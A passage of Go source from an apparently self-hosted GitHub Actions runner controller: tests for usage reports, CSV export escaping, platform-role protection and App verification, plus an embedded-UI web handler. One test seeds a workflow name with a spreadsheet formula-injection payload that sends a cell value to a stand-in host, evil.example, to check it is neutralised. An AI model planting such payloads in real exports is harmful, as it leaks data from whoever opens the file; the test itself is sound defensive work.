)

// A workflow can be called anything by anyone who can push to a repository the
// App can see, and its name lands in the first column of the export. Excel and
// Sheets evaluate a cell that begins with a formula character even when the CSV
// quoted it, so the operator who opens the export must get text, not a formula
// somebody else wrote.
func TestUsageCSVDefusesCellsThatWouldBeFormulas(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	// Matched, because usage reports this fleet's jobs and a job no pool
	// claimed is somebody else's hosted runner. What is under test here is the
	// export's escaping, so the job has to be one that reaches the export.
	if _, err := h.st.UpsertJob(h.ctx, &store.Job{
		GitHubJobID: 4242, Repo: "acme/widgets", JobName: "build",
		Workflow: `=HYPERLINK("https://evil.example/?"&A1,"open")`,
		Matched:  true,
		State:    store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done,
	}); err != nil {
		t.Fatalf("UpsertJob: %v", err)
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage.csv?group_by=workflow&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage csv")

	records, err := csv.NewReader(strings.NewReader(string(resp.body))).ReadAll()
	if err != nil {
		t.Fatalf("the export is not valid CSV: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("got %d records, want a header and one row: %q", len(records), resp.body)
	}
	if got := records[1][0]; !strings.HasPrefix(got, "'=") {
		t.Errorf("group cell = %q; a leading formula character must be neutralised with an apostrophe", got)
	}
}

// TestUsageReportsOnlyThisFleetsJobs is the wiring from the route to the scope.
//
// The report exists to answer what this fleet consumed. A job GitHub ran on one
// of its own hosted runners used no runner here, waited in no queue of ours and
// cost this fleet nothing, so counting it inflates every column on the page.
func TestUsageReportsOnlyThisFleetsJobs(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	for _, j := range []*store.Job{
		{GitHubJobID: 5001, Repo: "acme/ours", JobName: "build", Workflow: "ci", Matched: true,
			State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done},
		// No pool claimed it and no runner here ran it: somebody else's.
		{GitHubJobID: 5002, Repo: "acme/theirs", JobName: "build", Workflow: "ci",
			State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done},
	} {
		if _, err := h.st.UpsertJob(h.ctx, j); err != nil {
			t.Fatalf("seeding %s: %v", j.Repo, err)
		}
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage?group_by=repository&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage by repository")

	body := string(resp.body)
	if !strings.Contains(body, "acme/ours") {
		t.Errorf("this fleet's own repository is missing from the report: %s", truncate(resp.body))
	}
	if strings.Contains(body, "acme/theirs") {
		t.Errorf("a repository whose jobs ran on hosted runners is in the report: %s", truncate(resp.body))
	}
}

func TestCSVTextLeavesOrdinaryNamesAlone(t *testing.T) {
	for _, s := range []string{"", "acme/widgets", "build and test", "zoomies-linux-x64", "ins_k3f9qz2m"} {
		if got := csvText(s); got != s {
			t.Errorf("csvText(%q) = %q, want it unchanged", s, got)
		}
	}
	for _, s := range []string{"=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"} {
		if got := csvText(s); got != "'"+s {
			t.Errorf("csvText(%q) = %q, want an apostrophe prefix", s, got)
		}
	}
}

func TestUsageExactKeyFilterMatchesJSONAndCSV(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("usage-viewer", store.RoleViewer)
	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	for i, repo := range []string{"acme/one", "acme/two"} {
		if _, err := h.st.UpsertJob(h.ctx, &store.Job{GitHubJobID: int64(9900 + i), Repo: repo, Matched: true, State: store.JobQueued, QueuedAt: base}); err != nil {
			t.Fatal(err)
		}
	}
	for _, suffix := range []string{"", ".csv"} {
		resp := h.do(request{method: http.MethodGet, cookie: h.session(u), path: "/api/v1/usage" + suffix + "?group_by=repository&key=acme%2Fone&from=" + base.Add(-time.Hour).Format(time.RFC3339) + "&to=" + base.Add(time.Hour).Format(time.RFC3339)})
		resp.mustStatus(t, http.StatusOK, "filtered usage")
		if !strings.Contains(string(resp.body), "acme/one") || strings.Contains(string(resp.body), "acme/two") {
			t.Fatalf("wrong filter for %s: %s", suffix, resp.body)
		}
	}
}

// The width of a bucket can be asked for, within a bound.
//
// A punch card of a week is 168 squares an hour wide, and the route's own rule
// would cut that week into seven days. Hourly buckets over a year, times every
// repository, is a payload nobody wants, so the request is refused past a
// fortnight with a reason that says what to ask for instead. A wider bucket
// reaches further for the same count -- the Overview draws a month in
// four-hour squares and a quarter in eight -- and a width a day does not
// divide into is no width at all, because a calendar cuts days into squares.
func TestUsageIntervalCanBeAskedForWithinItsBound(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	if _, err := h.st.UpsertJob(h.ctx, &store.Job{
		GitHubJobID: 4343, Repo: "acme/widgets", JobName: "build", Workflow: "ci", Matched: true,
		State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done,
		Conclusion: "success",
	}); err != nil {
		t.Fatalf("UpsertJob: %v", err)
	}

	ask := func(days int, interval string) *response {
		path := "/api/v1/usage?group_by=repository&from=" + base.Format(time.RFC3339) +
			"&to=" + base.Add(time.Duration(days)*24*time.Hour).Format(time.RFC3339)
		if interval != "" {
			path += "&interval=" + interval
		}
		return h.do(request{method: http.MethodGet, cookie: h.session(u), path: path})
	}
	buckets := func(resp *response) int {
		var body struct {
			Items []store.UsageRow `json:"items"`
		}
		if err := json.Unmarshal(resp.body, &body); err != nil {
			t.Fatalf("decoding usage: %v", err)
		}
		if len(body.Items) != 1 {
			t.Fatalf("got %d rows, want the one repository", len(body.Items))
		}
		return len(body.Items[0].History)
	}

	resp := ask(7, "hour")
	resp.mustStatus(t, http.StatusOK, "a week in hours")
	if n := buckets(resp); n != 7*24 {
		t.Errorf("a week in hours has %d buckets, want %d", n, 7*24)
	}
	resp = ask(7, "")
	resp.mustStatus(t, http.StatusOK, "a week left to the rule")
	if n := buckets(resp); n != 7 {
		t.Errorf("a week left to the rule has %d buckets, want 7", n)
	}
	resp = ask(1, "day")
	resp.mustStatus(t, http.StatusOK, "a day in days")
	if n := buckets(resp); n != 1 {
		t.Errorf("a day in days has %d buckets, want 1", n)
	}

	resp = ask(15, "hour")
	resp.mustStatus(t, http.StatusBadRequest, "hours past the bound")
	if !strings.Contains(string(resp.body), "at most 14 days") {
		t.Errorf("the refusal does not say what the bound is: %s", resp.body)
	}
	resp = ask(1, "minute")
	resp.mustStatus(t, http.StatusBadRequest, "a width that is not a width")

	resp = ask(30, "4h")
	resp.mustStatus(t, http.StatusOK, "a month in four hours")
	if n := buckets(resp); n != 30*6 {
		t.Errorf("a month in four hours has %d buckets, want %d", n, 30*6)
	}
	resp = ask(90, "8h")
	resp.mustStatus(t, http.StatusOK, "a quarter in eight hours")
	if n := buckets(resp); n != 90*3 {
		t.Errorf("a quarter in eight hours has %d buckets, want %d", n, 90*3)
	}
	resp = ask(57, "4h")
	resp.mustStatus(t, http.StatusBadRequest, "four hours past the bound")
	if !strings.Contains(string(resp.body), "4h buckets cover at most 56 days") {
		t.Errorf("the refusal does not say what the bound is: %s", resp.body)
	}
	resp = ask(1, "5h")
	resp.mustStatus(t, http.StatusBadRequest, "a width a day does not divide into")
}

// The report is computed from rows the prune loop deletes on two different
// clocks: jobs are kept a month and runners a week by default. A 30-day
// runner-hours figure was therefore short by three weeks with nothing on the
// page saying so, which on the one page an operator takes to a finance
// meeting is the wrong figure to leave silent. The response now says where
// each history begins.
func TestUsageSaysWhereItsHistoryBegins(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)
	h.cfg.Retention.Jobs = 30 * 24 * time.Hour
	h.cfg.Retention.Runners = 7 * 24 * time.Hour

	now := h.ctrl.Now()
	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage?from=" + now.Add(-60*24*time.Hour).Format(time.RFC3339) +
			"&to=" + now.Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage")
	var body struct {
		HistoryFrom struct {
			Jobs    *time.Time `json:"jobs"`
			Runners *time.Time `json:"runners"`
		} `json:"history_from"`
	}
	resp.into(t, &body)
	if body.HistoryFrom.Jobs == nil || body.HistoryFrom.Runners == nil {
		t.Fatalf("history_from = %+v, want both instants", body.HistoryFrom)
	}
	if d := now.Sub(*body.HistoryFrom.Runners); d < 6*24*time.Hour || d > 8*24*time.Hour {
		t.Errorf("runners history begins %s ago, want about the 7-day retention", d)
	}
	if d := now.Sub(*body.HistoryFrom.Jobs); d < 29*24*time.Hour || d > 31*24*time.Hour {
		t.Errorf("jobs history begins %s ago, want about the 30-day retention", d)
	}

	// A window of zero keeps everything, and says so as null rather than as
	// an instant at the epoch that every range would appear to reach past.
	h.cfg.Retention.Runners = 0
	resp = h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage?from=" + now.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + now.Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage")
	resp.into(t, &body)
	if body.HistoryFrom.Runners != nil {
		t.Errorf("runners history_from = %v with retention off, want null", body.HistoryFrom.Runners)
	}
}

// Runner history now begins where the usage ledger does, not where the runner
// rows do: a runner whose row retention.runners has taken is still in the
// report, so saying its history starts a week ago would send an operator to
// look for a gap that is not there. The export says the same as the page,
// because a spreadsheet is what leaves the building.
func TestRunnerHistoryBeginsWhereTheLedgerDoesInTheReportAndTheExport(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)
	pool, host := h.pool(h.installation(), "linux-x64"), h.host("vm-1")
	r := &store.Runner{PoolID: pool.ID, HostID: host.ID, Name: "ledgered"}
	if err := h.st.CreateRunner(h.ctx, r); err != nil {
		t.Fatalf("CreateRunner: %v", err)
	}
	// Long enough to be allocation the export has a row for.
	time.Sleep(5 * time.Millisecond)
	for _, to := range []store.RunnerState{store.RunnerRegistering, store.RunnerRemoved} {
		if _, err := h.st.TransitionRunner(h.ctx, r.ID, to, ""); err != nil {
			t.Fatalf("TransitionRunner(%s): %v", to, err)
		}
	}
	for _, side := range []bool{true, false} {
		if _, err := h.st.ConfirmRunnerCleanup(h.ctx, r.ID, side); err != nil {
			t.Fatalf("ConfirmRunnerCleanup: %v", err)
		}
	}
	started, err := h.st.GetRunner(h.ctx, r.ID)
	if err != nil {
		t.Fatal(err)
	}
	// A retention shorter than the runner's age: the rows' own history begins
	// after the runner started, and only the ledger reaches back to it.
	time.Sleep(5 * time.Millisecond)
	h.cfg.Retention.Runners = time.Millisecond
	h.cfg.Retention.Jobs = 30 * 24 * time.Hour

	now := h.ctrl.Now()
	query := "?from=" + now.Add(-24*time.Hour).Format(time.RFC3339) + "&to=" + now.Add(time.Hour).Format(time.RFC3339)
	resp := h.do(request{method: http.MethodGet, cookie: h.session(u), path: "/api/v1/usage" + query})
	resp.mustStatus(t, http.StatusOK, "usage")
	var body struct {
		HistoryFrom struct {
			Runners *time.Time `json:"runners"`
		} `json:"history_from"`
	}
	resp.into(t, &body)
	if body.HistoryFrom.Runners == nil || !body.HistoryFrom.Runners.Equal(started.CreatedAt) {
		t.Fatalf("runners history_from = %v, want the ledger's first session at %v", body.HistoryFrom.Runners, started.CreatedAt)
	}

	resp = h.do(request{method: http.MethodGet, cookie: h.session(u), path: "/api/v1/usage.csv" + query})
	resp.mustStatus(t, http.StatusOK, "usage csv")
	records, err := csv.NewReader(strings.NewReader(string(resp.body))).ReadAll()
	if err != nil || len(records) != 2 {
		t.Fatalf("export = %q, %v; want a header and the pool's row", resp.body, err)
	}
	col := map[string]string{}
	for i, name := range records[0] {
		col[name] = records[1][i]
	}
	if got, want := col["history_from_runners"], started.CreatedAt.UTC().Format(time.RFC3339); got != want {
		t.Errorf("history_from_runners = %q, want %q", got, want)
	}
	if col["history_from_jobs"] == "" {
		t.Error("history_from_jobs is blank with thirty days of job retention")
	}
}

package api

import (
	"net/http"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// The platform role is only a line if an administrator cannot step over it.
// Before this was enforced an administrator could create a platform account,
// promote their own, or reset the platform's password and sign in as it --
// each one a single request, and each one the whole of what the role guards.
func TestAnAdministratorCannotGrantOrTakeOverThePlatformRole(t *testing.T) {
	h := newHarness(t)
	admin, _ := h.user("fleet-admin", store.RoleAdmin)
	plat, _ := h.user("operator-of-record", store.RolePlatform)
	cookie := h.session(admin)

	refused := []request{
		{method: http.MethodPost, path: "/api/v1/users", cookie: cookie,
			body: map[string]any{"username": "shadow", "password": "correct horse battery staple", "role": "platform"}},
		{method: http.MethodPatch, path: "/api/v1/users/" + admin.ID, cookie: cookie,
			body: map[string]any{"role": "platform"}},
		{method: http.MethodPost, path: "/api/v1/users/" + plat.ID + "/password", cookie: cookie,
			body: map[string]any{"new_password": "correct horse battery staple"}},
		{method: http.MethodPatch, path: "/api/v1/users/" + plat.ID, cookie: cookie,
			body: map[string]any{"disabled": true}},
		{method: http.MethodDelete, path: "/api/v1/users/" + plat.ID, cookie: cookie},
	}
	for _, req := range refused {
		resp := h.do(req)
		if resp.status != http.StatusForbidden {
			t.Errorf("%s %s as admin = %d, want 403: %s", req.method, req.path, resp.status, resp.body)
		}
	}
	if u, err := h.st.GetUser(h.ctx, admin.ID); err != nil || u.Role != store.RoleAdmin {
		t.Errorf("the administrator's role is now %v (err %v); it should still be admin", u.Role, err)
	}

	// The fleet's own accounts are still the administrator's to manage, so
	// the refusal is about the role and not about accounts in general.
	ok := h.do(request{method: http.MethodPost, path: "/api/v1/users", cookie: cookie,
		body: map[string]any{"username": "new-operator", "password": "correct horse battery staple", "role": "operator"}})
	if ok.status != http.StatusCreated {
		t.Errorf("an administrator could not create an operator: %d %s", ok.status, ok.body)
	}

	// And the platform may grant its own role.
	granted := h.do(request{method: http.MethodPost, path: "/api/v1/users", cookie: h.session(plat),
		body: map[string]any{"username": "second-platform", "password": "correct horse battery staple", "role": "platform"}})
	if granted.status != http.StatusCreated {
		t.Errorf("the platform could not create a platform account: %d %s", granted.status, granted.body)
	}
}

package api

import (
	"net/http"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// Verify has to name the permission, not the status code.
//
// An App created without the self-hosted-runners permission is the commonest
// way a connected installation fails, and it fails at the first runner call
// rather than at anything the connect dialog does -- so "403" arrives minutes
// later, attached to a pool that will not scale. The handler's own contract is
// that it says which permission and at what level; nothing asserted it.
func TestVerifyNamesTheMissingPermissionRatherThanTheStatus(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	admin, _ := h.user("root", store.RoleAdmin)

	// Everything but the one that matters for an organisation.
	h.gh.SetPermissions(map[string]string{
		"metadata": "read",
		"actions":  "read",
	})

	res := h.do(request{method: http.MethodPost, path: "/api/v1/installations/" + inst.ID + "/verify",
		cookie: h.session(admin)})
	res.mustStatus(t, http.StatusOK, "verify")

	var out struct {
		OK                 bool     `json:"ok"`
		Message            string   `json:"message"`
		MissingPermissions []string `json:"missing_permissions"`
	}
	res.into(t, &out)
	if out.OK {
		t.Fatal("an App missing the runner permission verified as healthy")
	}
	// The probe makes a real runner call, so an App without the permission
	// usually fails there rather than on what /app reported -- either way the
	// operator is told which permission, at what level, and what it is now.
	t.Logf("verify said: %s", out.Message)
	// The words an operator has to find on GitHub's own settings page, and the
	// level to set it to -- not the API's name for the field.
	if !strings.Contains(out.Message, "Self-hosted runners") {
		t.Errorf("the message does not name the permission an operator must grant: %q", out.Message)
	}
	if !strings.Contains(out.Message, "write") {
		t.Errorf("the message does not say what level to grant it at: %q", out.Message)
	}
	// And what it currently is, so somebody who granted read can see the
	// difference rather than wondering whether they granted anything.
	if !strings.Contains(strings.ToLower(out.Message), "not granted") {
		t.Errorf("the message does not say what the permission is now: %q", out.Message)
	}
}

// The other half: an App with the permissions and no `workflow_job`
// subscription still works, and says why it will be slower rather than
// refusing. Scaling falls back to the poller, which is a different problem
// from a broken credential and must not read like one.
func TestVerifySeparatesAMissingSubscriptionFromABrokenCredential(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	admin, _ := h.user("root", store.RoleAdmin)
	h.gh.SetEvents("push")

	res := h.do(request{method: http.MethodPost, path: "/api/v1/installations/" + inst.ID + "/verify",
		cookie: h.session(admin)})
	res.mustStatus(t, http.StatusOK, "verify")

	var out struct {
		OK            bool     `json:"ok"`
		Message       string   `json:"message"`
		MissingEvents []string `json:"missing_events"`
	}
	res.into(t, &out)
	if !out.OK {
		t.Fatalf("a working App with no webhook subscription was reported as broken: %q", out.Message)
	}
	if len(out.MissingEvents) != 1 || out.MissingEvents[0] != "workflow_job" {
		t.Fatalf("missing events = %v, want workflow_job", out.MissingEvents)
	}
	if !strings.Contains(out.Message, "poller") {
		t.Errorf("the message does not say what happens instead: %q", out.Message)
	}
}

// Verify says which repositories the installation can actually see.
//
// It is the second commonest setup mistake after a missing permission, and the
// quietest: an App with every permission correct, installed on "only select
// repositories" and not on the one somebody pushes to, is a fleet where
// nothing ever queues and no page says why. GitHub knows the answer and
// Zoomies never asked it.
func TestVerifySaysWhichRepositoriesTheInstallationCanSee(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	admin, _ := h.user("root", store.RoleAdmin)
	h.gh.SetRepositorySelection("selected")
	// What "selected" means on this installation: the three somebody ticked.
	h.gh.AddRepo("acme/widgets")
	h.gh.AddRepo("acme/site")
	h.gh.AddRepo("acme/infra")

	res := h.do(request{method: http.MethodPost, path: "/api/v1/installations/" + inst.ID + "/verify",
		cookie: h.session(admin)})
	res.mustStatus(t, http.StatusOK, "verify")

	var out struct {
		OK                  bool     `json:"ok"`
		RepositorySelection string   `json:"repository_selection"`
		RepositoryCount     int      `json:"repository_count"`
		Repositories        []string `json:"repositories"`
	}
	res.into(t, &out)
	if !out.OK {
		t.Fatal("a healthy installation failed to verify")
	}
	if out.RepositorySelection != "selected" {
		t.Errorf("repository_selection = %q, want GitHub's own word for it", out.RepositorySelection)
	}
	if out.RepositoryCount == 0 || len(out.Repositories) == 0 {
		t.Fatalf("the installation can see %d repositories and none was named; the dialog has nothing to show",
			out.RepositoryCount)
	}
	// Named, so an operator can look for the one they were expecting rather
	// than counting.
	for _, name := range out.Repositories {
		if !strings.Contains(name, "/") {
			t.Errorf("repository %q is not an owner/name", name)
		}
	}
}

package api

import (
	"bytes"
	"crypto/sha256"
	"embed"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"path"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// webdist holds the built operator UI.
//
// The directory is produced by `make ui` (Vite writes straight into it) and the
// Makefile keeps an index.html placeholder there for builds that skip the UI,
// so this embed never fails on a fresh checkout. The all: prefix is what pulls
// in dot-prefixed files, which a bundler will happily emit and which the
// default embed rules would silently drop.
//
//go:embed all:webdist
var webdist embed.FS

// placeholderMarker appears in the Makefile's stub index.html. Its presence is
// how the server knows the UI was not built, which /meta reports and the
// startup line says out loud -- otherwise "the dashboard is blank" is a mystery
// with no message attached to it.
const placeholderMarker = "The UI was not built"

// immutableMaxAge is how long a hashed asset may be cached. Vite content-hashes
// every file under assets/, so a changed file is a changed URL and a year is
// safe; index.html is the one file that is not hashed and is never cached.
const immutableMaxAge = 365 * 24 * time.Hour

// originToken is the placeholder the page's sharing tags carry in place of this
// controller's own address.
//
// og:url and og:image have to be absolute for a link preview to render at all:
// the service fetching the page is not a browser and has no base to resolve a
// relative path against. The address is a deployment fact rather than a build
// one, so it is substituted when the controller starts. A controller with no
// server.external_url set is left with relative paths, which is the honest
// answer -- it does not know its own address, and inventing one would produce a
// preview pointing at the wrong host.
const originToken = "__ZOOMIES_ORIGIN__"

// robotsToken is the placeholder the page's robots directive carries. It is
// substituted from server.allow_indexing at startup, alongside the address,
// because both are deployment facts that a build cannot know.
const robotsToken = "__ZOOMIES_ROBOTS__"

// spaHandler serves the embedded single-page application.
type spaHandler struct {
	files fs.FS
	// index is index.html, held in memory because every unmatched route serves
	// it and it is a couple of kilobytes.
	index []byte
	// built is false when only the Makefile's placeholder is embedded.
	built   bool
	modTime time.Time
	hashes  []string
	// indexETag is index.html's validator, derived from the bytes actually
	// served. See serveIndex for why it, rather than a modification time, is
	// what decides whether a browser may keep the copy it has.
	indexETag string
	// gz holds each static file's gzip body, made the first time somebody asks
	// for it. Compressing at startup would cost every controller start a few
	// hundred milliseconds for files most operators never fetch; compressing per
	// request would spend CPU on the same bytes thousands of times.
	// A pointer so the handler can be copied; nil means nothing is kept.
	gz *sync.Map // file name -> []byte
}

// newSPAHandler prepares the embedded UI for serving. externalURL is the
// address operators reach this controller on, and may be empty; allowIndexing
// is server.allow_indexing.
func newSPAHandler(externalURL string, allowIndexing bool) (*spaHandler, error) {
	sub, err := fs.Sub(webdist, "webdist")
	if err != nil {
		return nil, fmt.Errorf("api: the embedded UI directory is unusable: %w", err)
	}
	index, err := fs.ReadFile(sub, "index.html")
	if err != nil {
		return nil, fmt.Errorf("api: the embedded UI has no index.html; run `make ui` (or `make build-nogui` for the placeholder): %w", err)
	}
	// The substitution touches attribute values only, never a script body, so
	// the inline-script hashes below still describe what the browser executes.
	index = bytes.ReplaceAll(index, []byte(originToken),
		[]byte(strings.TrimRight(strings.TrimSpace(externalURL), "/")))
	robots := "noindex, nofollow"
	if allowIndexing {
		robots = "index, follow"
	}
	index = bytes.ReplaceAll(index, []byte(robotsToken), []byte(robots))

	h := &spaHandler{
		files:   sub,
		index:   index,
		built:   !strings.Contains(string(index), placeholderMarker),
		modTime: buildTime(),
		gz:      &sync.Map{},
	}
	h.hashes = inlineScriptHashes(index)
	// Computed from the substituted bytes, not the embedded ones: two
	// controllers built from the same commit but pointed at different external
	// URLs serve different pages, and a validator that said otherwise would let
	// a browser keep the wrong one.
	sum := sha256.Sum256(index)
	h.indexETag = `"` + base64.RawURLEncoding.EncodeToString(sum[:16]) + `"`
	return h, nil
}

// inlineScriptHashes returns the CSP source expressions for the page's inline
// scripts.
//
// Computing them from the embedded file rather than hard-coding them means the
// policy follows the UI build: if the theme bootstrap changes by a byte, the
// hash changes with it, and neither a stale allow-list nor an 'unsafe-inline'
// escape hatch is left behind.
func (h *spaHandler) inlineScriptHashes() []string { return h.hashes }

// The two groups are the opening tag's attributes and the script body.
var inlineScriptRE = regexp.MustCompile(`(?is)<script([^>]*)>(.*?)</script\s*>`)
var srcAttrRE = regexp.MustCompile(`(?is)\ssrc\s*=`)
var ldJSONRE = regexp.MustCompile(`(?is)type\s*=\s*["']?application/ld\+json`)

func inlineScriptHashes(html []byte) []string {
	var out []string
	for _, m := range inlineScriptRE.FindAllSubmatch(html, -1) {
		if srcAttrRE.Match(m[1]) {
			// An external script is covered by 'self'; only the inline body of
			// a script needs a hash.
			continue
		}
		if ldJSONRE.Match(m[1]) {
			// Structured data is never executed, so allowing it in script-src
			// would say something untrue about what this page runs.
			continue
		}
		body := m[2]
		if len(strings.TrimSpace(string(body))) == 0 {
			continue
		}
		sum := sha256.Sum256(body)
		out = append(out, "sha256-"+base64.StdEncoding.EncodeToString(sum[:]))
	}
	return out
}

// ServeHTTP serves a built asset, or index.html for anything that looks like a
// client-side route.
func (h *spaHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodHead {
		methodNotAllowed(w, r)
		return
	}

	name := path.Clean(strings.TrimPrefix(r.URL.Path, "/"))
	switch name {
	case ".", "/", "index.html":
		h.serveIndex(w, r)
		return
	}

	f, err := h.files.Open(name)
	if err == nil {
		defer f.Close()
		if st, serr := f.Stat(); serr == nil && !st.IsDir() {
			if seeker, ok := f.(io.ReadSeeker); ok {
				h.setCacheHeaders(w, name)
				if h.serveGzip(w, r, name, st.Size(), seeker) {
					return
				}
				http.ServeContent(w, r, path.Base(name), h.modTime, seeker)
				return
			}
		}
	}

	// Not a file we have. A path with an extension was asking for one -- a
	// missing image, a stale asset URL from a cached page -- and answering it
	// with the index page would produce a JavaScript file that is secretly
	// HTML, which fails much later and much more confusingly than a 404.
	if path.Ext(name) != "" {
		notFound(w, "no such file: /"+name)
		return
	}
	h.serveIndex(w, r)
}

// compressibleAsset is whether a static file is text a gzip body suits. Images
// and fonts are already compressed, and a second pass makes them larger.
func compressibleAsset(name string) bool {
	switch strings.ToLower(path.Ext(name)) {
	case ".js", ".mjs", ".css", ".svg", ".json", ".html", ".webmanifest", ".txt", ".xml", ".map":
		return true
	}
	return false
}

func (h *spaHandler) load(name string) ([]byte, bool) {
	if h.gz == nil {
		return nil, false
	}
	v, ok := h.gz.Load(name)
	if !ok {
		return nil, false
	}
	return v.([]byte), true
}

// serveGzip answers with the file's gzip body when the client takes one, and
// reports whether it did. A request for a byte range is left to the identity
// body: a range of a compressed body is not a range of the file, and browsers
// do not ask for one of a script.
func (h *spaHandler) serveGzip(w http.ResponseWriter, r *http.Request, name string, size int64, f io.ReadSeeker) bool {
	if !compressibleAsset(name) || size < gzipMinSize {
		return false
	}
	// Said on the identity answer too, so a shared cache keeps the two apart.
	w.Header().Add("Vary", "Accept-Encoding")
	if r.Header.Get("Range") != "" || !acceptsGzip(r) {
		return false
	}
	var body []byte
	if v, ok := h.load(name); ok {
		body = v
	} else {
		raw, err := io.ReadAll(f)
		if err != nil {
			return false
		}
		// Rewound for the caller, which falls back to the file on any later
		// refusal and expects it where it left it.
		if _, err := f.Seek(0, io.SeekStart); err != nil {
			return false
		}
		body = gzipBody(raw)
		if h.gz != nil {
			h.gz.Store(name, body)
		}
	}
	w.Header().Set("Content-Encoding", "gzip")
	// ServeContent leaves the length off an encoded body, on the assumption
	// that something downstream will change it. Nothing will, and without it
	// the browser has no size to show a progress bar against.
	w.Header().Set("Content-Length", strconv.Itoa(len(body)))
	http.ServeContent(w, r, path.Base(name), h.modTime, bytes.NewReader(body))
	return true
}

func (h *spaHandler) serveIndex(w http.ResponseWriter, r *http.Request) {
	// Never cached: it names the hashed assets, so a stale copy points a
	// browser at files that no longer exist after an upgrade.
	w.Header().Set("Cache-Control", "no-cache, must-revalidate")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("ETag", h.indexETag)
	// The zero time is deliberate, and it is the whole fix: it stops
	// ServeContent sending Last-Modified and stops it honouring
	// If-Modified-Since, leaving the ETag above as the only validator.
	//
	// buildTime() is a constant, so every build claimed the same
	// Last-Modified. A browser revalidating this page after an upgrade -- and
	// it always revalidates, because of the no-cache above -- was answered 304
	// and kept the previous build's index.html, which names content-hashed
	// chunks that are no longer in the binary. The shell still booted from its
	// own immutable cached bundle, so the failure showed up only on the first
	// route the user had not already visited: its chunk 404s and the page
	// renders "That page could not be loaded". Reloading did not help either,
	// because a reload revalidates the same way and is answered 304 again.
	//
	// A validator taken from the bytes cannot drift like that, and dropping
	// Last-Modified is what frees a browser that cached under the old constant:
	// it has no stored ETag, so it sends only If-Modified-Since, which is now
	// ignored.
	http.ServeContent(w, r, "index.html", time.Time{}, bytes.NewReader(h.index))
}

func (h *spaHandler) setCacheHeaders(w http.ResponseWriter, name string) {
	if strings.HasPrefix(name, "assets/") {
		w.Header().Set("Cache-Control", fmt.Sprintf("public, max-age=%d, immutable", int(immutableMaxAge.Seconds())))
		return
	}
	// Images are not hashed either, but they change with a release and not
	// between two page loads, and the biggest of them (the logos) are three
	// hundred kilobytes that a returning visitor on a phone fetched again every
	// five minutes. A week is held; the day after is served stale while the
	// browser checks, so a replaced logo shows up on the next visit and not the
	// one after.
	switch strings.ToLower(path.Ext(name)) {
	case ".png", ".ico", ".jpg", ".jpeg", ".webp", ".avif":
		w.Header().Set("Cache-Control", "public, max-age=604800, stale-while-revalidate=86400")
		return
	}
	// Everything else at the root -- a manifest -- is not hashed and may change
	// meaning, so it is revalidated rather than held.
	w.Header().Set("Cache-Control", "public, max-age=300")
}

// buildTime is the modification time reported for embedded files.
//
// Embedding does not preserve timestamps, so there is nothing truthful to
// report; a fixed, non-zero time makes conditional requests work consistently
// (the ETag-less If-Modified-Since path) without pretending each file was
// written when the process started.
func buildTime() time.Time { return time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC) }

// uiRoutes are the operator UI's own pages, in the order the navigation lists
// them: the addresses worth naming in a sitemap.
//
// They are the top-level pages only. A runner or a pool has its own address,
// but it is a row of a fleet rather than a page of a site: the set changes
// every few minutes and every one of them is gone by tomorrow, which is the
// opposite of what a sitemap is for.
//
// This list mirrors ROUTES in web/src/lib/router.ts. TestSitemapListsPagesTheAppActuallyServes
// keeps it from naming a page that no longer exists.
var uiRoutes = []string{
	"/",
	"/pools",
	"/runners",
	"/workflows",
	"/jobs",
	"/queue",
	"/usage",
	"/hosts",
	"/installations",
	"/migrate",
	"/audit",
	"/settings",
	"/login",
}

// requestOrigin is the absolute address to write into robots.txt and the
// sitemap.
//
// server.external_url is the truth when it is set, because it is what the
// operator told GitHub and what browsers are pointed at. Without it the
// request's own Host is the best available answer -- unlike the sharing tags
// baked into index.html at startup, these two files are rendered per request,
// so there is a Host header to read and no need to guess. The scheme comes from
